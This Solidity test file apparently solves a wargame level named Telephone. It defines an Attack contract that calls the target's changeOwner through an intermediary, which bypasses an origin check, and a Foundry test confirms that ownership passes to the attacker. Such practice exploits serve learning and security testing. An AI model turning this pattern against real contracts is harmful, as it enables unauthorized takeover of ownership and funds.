// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";

contract Attack {
    Telephone target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}

contract TelephoneTest is Test {
    Telephone telephone;
    Attack attackContract;
    address attacker;

    function setUp() public {
        telephone = new Telephone();
        attackContract = new Attack(address(telephone));
        attacker = vm.addr(1);
    }

    function testExploit() public {
        // attacker calls attack contract
        vm.prank(attacker);
        attackContract.attack(attacker);

        // verify ownership changed
        assertEq(telephone.owner(), attacker);
    }
}